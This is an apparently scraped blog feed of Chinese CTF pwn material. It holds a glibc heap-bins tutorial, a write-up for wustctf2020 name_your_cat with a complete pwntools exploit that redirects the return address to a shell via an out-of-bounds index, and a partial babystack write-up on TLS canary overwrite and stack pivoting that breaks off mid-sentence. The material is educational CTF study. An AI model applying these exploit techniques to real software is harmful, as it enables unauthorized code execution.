PWN_堆与堆溢出10.png"></p><hr><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><blockquote><p><code>fast bin</code> 非常像高速缓存 cache，为了减少一些较小的 <code>chunk</code> 在合并、分割以及中间检查的过程中的开销，<code>ptmalloc2</code> 中专门设计了 <code>fast bin</code>，对应的变量就是 <code>malloc state</code> 中的 <code>fastbinsY[]</code> 数组，用于提高小内存分配效率</p></blockquote><ul><li><code>fast bin</code> 存储在 <code>fastbinsY[]</code> 处，是 10 个<strong>单链表</strong>（最后 3 个链表保留未使用）</li><li><code>fast bin</code> 的 <code>chunk</code> 大小（含 <code>chunk</code> 头部）为：<code>16 ~ 64</code> 字节（64 位为 <code>32 ~ 128</code> 字节）</li><li>相邻 <code>bin</code> 存放的大小相差 8 字节（64 位为 16 字节）</li><li><strong>采取 <code>LIFO</code> 策略</strong>（最近释放的 <code>chunk</code> 会更早地被分配）</li><li><code>chunk</code> 的 <code>PREV_INUSE</code> 位（下一个物理相邻的 <code>chunk</code> 的 <code>P</code> 位）总为 1，释放到 <code>fastbin</code> 的 <code>chunk</code> 不会被清除 <code>PREV_INUSE</code> 标志位</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA11.png" alt="CTF - PWN_堆与堆溢出11.png"></p><p>如果遇到以下两种情况，<code>ptmalloc2</code> 会首先判断 <code>fast bin</code> 中相应的 <code>bin</code> 中是否有对应大小的空闲块，如果有的话，就会直接从这个 <code>bin</code> 中获取 <code>chunk</code>；如果没有的话，<code>ptmalloc2</code> 才会做接下来的一系列操作：</p><ul><li>在 32 位系统中（<code>SIZE_SZ = 4</code>），用户需要的 <code>chunk</code> 大小 &lt; 64 字节</li><li>在 64 位系统中（<code>SIZE_SZ = 8</code>），用户需要的 <code>chunk</code> 大小 &lt; 128 字节</li></ul><p>关于 <code>fast bin</code> 的大小定义如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">DEFAULT_MXFAST </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEFAULT_MXFAST</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span><span class="token comment">/* The maximum fastbin request size we support */</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_FAST_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 32 位系统中，<code>fast bin</code> <strong>默认支持</strong>最大的 <code>chunk</code> 的数据空间大小为 64 字节：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">DEFAULT_MXFAST <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是其<strong>可以支持</strong>的 <code>chunk</code> 的数据空间最大为 80 字节：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">MAX_FAST_SIZE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>fast bin</code> 最多可以支持的 <code>bin</code> 的个数为 10 个</strong>，在 32 位系统中，用户数据空间从第 8 字节开始一直到第 80 字节（不包括 <code>prev_size</code> 和 <code>size</code> 字段的 8 字节）</p><blockquote><p>注意：</p><p><strong>fast bin 中的 <code>chunk</code> 的 <code>PREV_INUSE</code> 位（下一个物理相邻的 chunk 的 P 位）始终被置为 1</strong>，因此它们不会和其它被释放的 <code>chunk</code> 合并，这也是为什么前面说 fast bin 是个特例，不会轻易合并</p><p>但是，当释放的 <code>chunk</code> 与该 <code>chunk</code> 相邻的空闲 <code>chunk</code> 合并后的大小 &gt; <code>FASTBIN_CONSOLIDATION_THRESHOLD</code> 时，说明内存碎片较多，此时就需要把 <code>fast bin</code> 中的 <code>chunk</code> 都进行合并，以减少内存碎片对系统的影响</p></blockquote><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p><code>unsorted bin</code> 非常像缓冲区 buffer，可以视为空闲 <code>chunk</code> 回归其所属 <code>bin</code> 之前的缓冲区</p><p>大小超过 <code>fast bin</code> 阈值的 <code>chunk</code> 被释放时会加入到这里，这使得 <code>ptmalloc2</code> 可以复用最近释放的chunk，从而提升效率</p></blockquote><ul><li><code>unsorted bin</code> 处于 <code>bins[1]</code> 处，因此 <code>unsorted bin</code> 只有 1 个<strong>双向循环链表</strong></li><li><code>unsorted bin</code> 中的空闲 <code>chunk</code> 处于<strong>乱序状态</strong></li><li>**<code>unsorted bin</code> 在使用的过程中，采用的遍历顺序是 <code>FIFO</code>**（插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取）</li><li>在 <code>malloc</code> 分配时，如果在 <code>fast bin</code>、<code>small bin</code> 中找不到对应大小的 <code>chunk</code>，就会尝试从 <code>unsorted bin</code> 中寻找 <code>chunk</code>。如果取出来的 <code>chunk</code> 大小刚好满足，就会直接返回给用户；如果在 <code>unsorted bin</code> 中没有合适的 <code>chunk</code>，就会把 <code>unsorted bin</code> 中的所有 <code>chunk</code> 分别加入到所属的 <code>bin</code> 中，然后再在 <code>bin</code> 中分配合适的 <code>chunk</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA14.png" alt="CTF - PWN_堆与堆溢出14.png"></p><blockquote><p>当 <code>free</code> 的 <code>chunk</code> 大小 &gt;&#x3D; 144 字节时，为了效率，Glibc 并不会马上将 <code>chunk</code> 放到相对应的 <code>bin</code> 中，而会先放到 <code>unsorted bin</code></p><p>下次 <code>malloc</code> 时会先查找 <code>unsorted bin</code> 中是否有合适的 <code>chunk</code>，找不到才会去对应的 <code>bin</code> 中寻找，此时会顺便把 <code>unsorted bin</code> 的 <code>chunk</code> 放到对应的 <code>bin</code> 中，但 <code>small bin</code> 除外，为了效率，反⽽先从 <code>small bin</code> 找</p></blockquote><hr><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><blockquote><p><code>chunk size</code> 小于 <code>0x200</code> 字节（64 位为 <code>0x400</code> 字节）的 <code>chunk</code> 叫做 <code>small chunk</code>，而 <code>small bin</code> 存放的就是这些 <code>small chunk</code></p></blockquote><ul><li><code>small bin</code> 存储在 <code>bins[2]</code> 至 <code>bins[63]</code> 处，是 62 个<strong>双向循环链表</strong>（每个链表都有链表头结点，这样可以方便对于链表内部结点的管理）</li><li><code>fast bin</code> 的 <code>chunk</code> 大小（含 <code>chunk</code> 头部）为：<code>16 ~ 496</code> 字节（64 位为 <code>32 ~ 1008</code> 字节）</li><li>相邻 <code>bin</code> 存放的大小相差 8 字节（64 位为 16 字节）</li><li><em>每个链表中存储的 <code>chunk</code> 大小都一致</em></li><li><strong>采取 <code>FIFO</code> 策略</strong>（最近释放的 <code>chunk</code> 会被最后分配），这点和 <code>fast bin</code> 相反</li><li>同样与 <code>fast bin</code> 相反的是：<em>相邻的空闲 <code>chunk</code> 会被合并</em></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA12.png" alt="CTF - PWN_堆与堆溢出12.png"></p><p><code>small bin</code> 中每个 <code>chunk</code> 的大小与其所在的 <code>bin</code> 的 <code>index</code> 的关系为：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">chunk_size <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">*</span> index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>small bin</code> 的大小再分成 62 个 <code>bin</code>，大小从 16 字节（64 位为 32 字节）开始，每次固定增加 8 字节（64 位为 16 字节）：</p><table><thead><tr><th>下标 index</th><th>SIZE_SZ&#x3D;4（32 位）</th><th>SIZE_SZ&#x3D;8（64 位）</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td><code>x</code></td><td><code>2 * 4 * x</code></td><td><code>2 * 8 * x</code></td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><blockquote><p>注意：</p><p><code>fast bin</code> 中的 <code>chunk</code> 是有可能被放到 <code>small bin</code> 中去的</p></blockquote><hr><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><blockquote><p><code>large bin</code> 存放的是大于等于 <code>0x200</code> 字节（64 位为 <code>0x400</code> 字节）的 <code>chunk</code></p></blockquote><ul><li><code>large bin</code> 存储在 <code>bins[64]</code> 至 <code>bins[126]</code> 处，是 63 个<strong>双向循环链表</strong></li><li><em>每个 bin 中的 chunk 的大小不一致（按大小降序排列）</em></li><li><strong>采取 <code>FIFO</code> 策略</strong></li><li>插入和删除可以发生在任意位置</li><li>相邻空闲 <code>chunk</code> 会被合并</li></ul><p><code>large bin</code> 的 <code>freed chunk</code> 会多两个指针 <code>fd_nextsize</code>、<code>bk_nextsize</code>，分别指向前一块和后一块 <code>large chunk</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA13.png" alt="CTF - PWN_堆与堆溢出13.png"></p><p><code>large bin</code> 的大小再分成 63 个 <code>bin</code>，但大小不再是固定大小增加，而是按照公差分为 6 组：</p><table><thead><tr><th>组</th><th>bin 的数量</th><th>公差</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>0x40</td></tr><tr><td>2</td><td>16</td><td>0x200</td></tr><tr><td>3</td><td>8</td><td>0x1000</td></tr><tr><td>4</td><td>4</td><td>0x8000</td></tr><tr><td>5</td><td>2</td><td>0x40000</td></tr><tr><td>6</td><td>1</td><td>不限制，大小和 large bin 剩余的大小相同</td></tr></tbody></table><hr><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><blockquote><p><code>tcache</code> 是 libc2.26（Ubuntu 17.10）之后引进的一种新机制，类似于 <code>fast bin</code> 一样的东西，目的是提升堆管理的性能，但提升性能的同时舍弃了很多安全检查，也因此有了很多新的利用方式</p></blockquote><ul><li>每条链上最多可以有 7 个 <code>chunk</code></li><li><code>malloc</code> 的时候优先去 <code>tcache</code> 找</li><li><code>free</code> 的时候当 <code>tcache</code> 满了才放入 <code>fastbin</code> 或 <code>unsorted bin</code></li></ul><p>基本工作方式：</p><ul><li><p><code>malloc</code> 时，会先 <code>malloc</code> 一块内存用来存放 <code>tcache_perthread_struct</code></p></li><li><p><code>free</code> 内存，且 <code>size</code> 小于 <code>small bin size</code> 时</p><ol><li>先放到对应的 <code>tcache</code> 中，直到 <code>tcache</code> 被填满（默认是 7 个）</li><li><code>tcache</code> 被填满之后，再次 <code>free</code> 的内存和之前一样被放到 <code>fast bin</code> 或者 <code>unsorted bin</code> 中</li><li><code>tcache</code> 中的 <code>chunk</code> 不会合并（不取消 <code>PREV_INUSE</code> 位）</li></ol></li><li><p><code>malloc</code> 内存，且 <code>size</code> 在 <code>tcache</code> 范围内</p><ol><li>先从 <code>tcache</code> 取 <code>chunk</code>，直到 <code>tcache</code> 为空</li><li><code>tcache</code> 为空后，从 <code>bin</code> 中找</li><li><code>tcache</code> 为空时，如果 <code>fast bin</code>、<code>small bin</code>、<code>unsorted bin</code> 中有 <code>size</code> 符合的 <code>chunk</code>，会先把 <code>fast bin</code>、<code>small bin</code>、<code>unsorted bin</code> 中的 <code>chunk</code> 放到 <code>tcache</code> 中，直到填满；之后再从 <code>tcache</code> 中取；因此 <code>chunk</code> 在 <code>bin</code> 中和 <code>tcache</code> 中的顺序会反过来</li></ol></li></ul><hr>]]></content>
    
    
    <summary type="html">都说 PWN 的世界分为栈、堆和内核，这篇文章主要介绍了堆这种数据结构的相关概念，作为堆利用的前置基础</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【wustctf 2020】name_your_cat</title>
    <link href="https://www.uf4te.cn/posts/35b1366d.html"/>
    <id>https://www.uf4te.cn/posts/35b1366d.html</id>
    <published>2024-05-14T15:35:36.000Z</published>
    <updated>2024-06-05T06:36:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><mark>利用数组下标越界实现绕过 Canary 修改栈上的返回值</mark></li></ul><hr><p><a href="https://buuoj.cn/challenges#wustctf2020_name_your_cat">【wustctf2020】name_your_cat</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat1.png" alt="【wustctf2020】name_your_cat1.png"></p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat2.png" alt="【wustctf2020】name_your_cat2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat3.png" alt="【wustctf2020】name_your_cat3.png"></p><p>这里循环了 5 次，关键在于 <code>NameWhich()</code> 函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat4.png" alt="【wustctf2020】name_your_cat4.png"></p><p>在 <code>NameWhich()</code> 中首先让我们输入一个数存放到 <code>v2</code> 地址处，由于 <code>v2</code> 是一个数组，数组名代表数组第一个元素的地址，因此其实是让我们输入 <code>v2[0]</code> 的值</p><p>然后让我们输入一个最多 7 个字符的字符串存放在 <code>8 * v2[0] + a1</code> 地址处，由于 <code>a1</code> 是作为 char 型数组 <code>v3</code> 的形参，因此这里是让我们输入 <code>v3[8 * v2[0]]</code> 的值</p><p>存在一个后门函数 <code>shell()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat5.png" alt="【wustctf2020】name_your_cat5.png"></p><p>查看栈中的布局：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat6.png" alt="【wustctf2020】name_your_cat6.png"></p><p>由于存在 Canary，且没有其他的溢出点</p><p>但考虑到我们可以通过输入 <code>v3[8 * v2[0]]</code> 的值控制 <code>v3[]</code> 数组，同时程序没有对数组边界进行检查</p><p>因此我们可以使 <code>v3[]</code> 数组的下标越界，进而绕过 Canary 修改栈上的返回值</p><p><code>v3</code> 首地址距离栈上的返回地址 <code>0x34 + 0x4 = 0x38</code>，当 <code>v2[0] = 0</code> 时即对应 <code>v3</code> 的首地址</p><p>因此要修改返回地址的话，<code>v2[0]</code> 应该等于 <code>0x38 / 8 = 7</code></p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./wustctf2020_name_your_cat"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./wustctf2020_name_your_cat"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">25944</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">NameWhich</span><span class="token punctuation">(</span>payload1<span class="token punctuation">,</span> payload2<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Give your name plz: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>        NameWhich<span class="token punctuation">(</span><span class="token string">b'0'</span><span class="token punctuation">,</span> <span class="token string">b'uf4te'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        NameWhich<span class="token punctuation">(</span><span class="token string">b'7'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{b953f0db-02fb-41e0-8b8e-11f9a74cc362}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat7.png" alt="【wustctf2020】name_your_cat7.png"></p>]]></content>
    
    
    <summary type="html">题目比较简单，但是一种比较少见的 Canary Bypass 方法，通过数组下标越界绕过 Canary 直接修改栈上的返回值</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://www.uf4te.cn/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>【Star Ctf 2018】babystack</title>
    <link href="https://www.uf4te.cn/posts/11e500a1.html"/>
    <id>https://www.uf4te.cn/posts/11e500a1.html</id>
    <published>2024-05-14T07:14:45.000Z</published>
    <updated>2024-06-05T06:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>当溢出长度够大且程序创建了子线程时，可以通过修改 TLS 结构体中的 <code>stack_guard</code> 来控制 Canary</mark></p></li><li><p><mark>GDB 进行多线程的调试方法</mark></p></li><li><p><mark>通过 <code>read()</code> 将 one_gadget 写到 BSS 段上，然后利用栈迁移执行 one_gadget</mark></p></li><li><p>如果发现成功构造 <code>system(&quot;/bin/sh&quot;)</code> 后仍出现错误，尝试使用 one_gadget 或者 ret2syscall 构造 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 来 getshell</p></li></ul><hr><p><a href="https://buuoj.cn/challenges#starctf2018_babystack">【Star Ctf 2018】babystack</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看程序保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack1.png" alt="【starctf2018】babystack1.png"></p><p>已知 Glibc 版本为 2.27</p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack2.png" alt="【starctf2018】babystack2.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack3.png" alt="【starctf2018】babystack3.png"></p><p>程序通过 <code>pthread_create(newthread, 0LL, start_routine, 0LL);</code> 创建了一个线程</p><blockquote><p>注意，关于线程函数的一点说明：</p><p><code>pthread_create</code> 用于创建一个线程，<code>pthread_join</code> 使一个线程等待另一个线程结束</p><p>如果没有 <code>pthread_join</code> 的话，主线程会很快结束从而使整个进程结束，创建的线程还没有机会执行整个线程就已经结束了</p><p>使用了 <code>pthread_join</code> 后，主线程会一直等待，直到等待的线程结束后主线程才会结束，使创建的线程有机会执行</p></blockquote><p>线程从 <code>start_routine()</code> 函数开始执行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack4.png" alt="【starctf2018】babystack4.png"></p><p>首先通过 <code>sub_400906()</code> 获取用户输入，这个输入表示我们想要发送多少字节的数据：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack5.png" alt="【starctf2018】babystack5.png"></p><p>这里的 <code>atol()</code> 函数将我们输入的字符串转换成一个长整数，返回给 <code>v2</code></p><p>如果 <code>v2 &lt;= 0x10000</code>，就调用 <code>sub_400957(0LL, s, v2);</code> 让我们向 <code>s</code> 中输入数据</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack6.png" alt="【starctf2018】babystack6.png"></p><p>注意到 <code>memset(s, 0, 0x1000uLL);</code> 为 <code>s</code> 初始化的空间长度为 <code>0x1000</code>，远远小于 <code>0x10000</code>，因此是存在溢出的</p><p>这里溢出的长度非常大，我们可以覆盖很多内容</p><p>由于 Canary 的生成是在程序的函数入口处从 GS 段（32 位）或 FS 段（64 位）内获取一个随机值，可以在 IDA 中看到对应位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF-PWN_Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B613.png" alt="CTF-PWN_Bypass安全机制13.png"></p><p>栈上的 Canary 的值其实来自于 TLS（Thread Local Storage），在 64 位程序中，TLS 由 FS 寄存器指向，因此这里的 <code>fs:28h</code> 其实是 Canary 在 TLS 中的偏移</p><blockquote><p>当程序创建线程的时候，会顺便创建一个 TLS 用来存储线程私有的数据，该 TLS 也会存储 Canary 的值，而 TLS 会保存在栈的高地址处 <strong>（这也是为什么说同一个进程中的不同线程的 Canary 是相同的）</strong></p></blockquote><p>因此，我们只要覆盖 TLS 中 Canary 的值，那么整个程序的 Canary 的值就是由我们来定的了</p><p>接下来就是动态调试确定偏移量了</p><blockquote><p>注意，这里涉及到多线程，需要进行多线程的 GDB 动态调试，如果不熟悉的话，可以看看本站《<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDB的基础和使用</a>》一文中的 <em>《pthread 多线程调试》</em> 部分</p></blockquote><p>为了便于我们调试，我们首先在子线程的 <code>start_routine()</code> 中下好断点：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">b *0x4009E7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack8.png" alt="【starctf2018】babystack8.png"></p><p>GDB 就自动调试到子线程中了，一直到 <code>sub_400906()</code> 让我们输入长度时，输入大一点，我这里输入 <code>0x3000</code></p><p>但是发现好像第二次在 <code>sub_400957(0, s, v2);</code> 中的输入被跳过了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack9.png" alt="【starctf2018】babystack9.png"></p><p>由于我们也没办法输入回车符、换行符，因此用脚本来测试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入调试后，我们首先需要将调试的线程切换到子线程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> thread <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后正常调试发送 payload，查看栈中的布局：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack10.png" alt="【starctf2018】babystack10.png"></p><p>我们输入的数据在 <code>0x7f97df1fdee0</code> 地址处</p><p>GDB 获取子线程的 TLS 在栈上的首地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/x pthread_self<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于 Canary 在 TLS 中偏移 <code>0x28</code> 的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack11.png" alt="【starctf2018】babystack11.png"></p><p>于是我们输入的位置距离 TLS 中 Canary 的位置：<code>(0x7f97df1ff700 + 0x28) - 0x7f97df1fdee0 = 0x1848</code> 字节</p><p>因此我们至少需要溢出 <code>0x1848 + 0x8 = 0x1850</code> 字节</p><p>虽然程序没有开 PIE，但也没有 <code>system()</code> 和 <code>b&#39;/bin/sh&#39;</code>，因此我们还是需要通过 libc 偏移进行计算，这里选择先使用 <code>puts_plt_addr</code> 输出 <code>puts_got_addr</code> 泄露 <code>puts()</code> 的真实地址</p><p>同时，这里只有一次机会</p><blockquote><p>反正我尝试让程序执行流回到 <code>start_routine()</code> 或者 <code>main()</code> 后，在第二次发送 payload 时都会导致程序崩溃</p></blockquote><p>因此，最后选择首先通过 <code>read()</code> 将 <code>system(&quot;/bin/sh&quot;)</code> 写到一个可写入的地方，我这里选择的是 BSS 段首地址的下一地址 <code>target_addr</code> 处</p><p>然后利用 <code>leave; ret</code> 指令实现栈迁移</p><p>其中 <code>leave</code> 指令将 EBP 迁移到 <code>target_addr - 8</code> 的地方（即：BSS 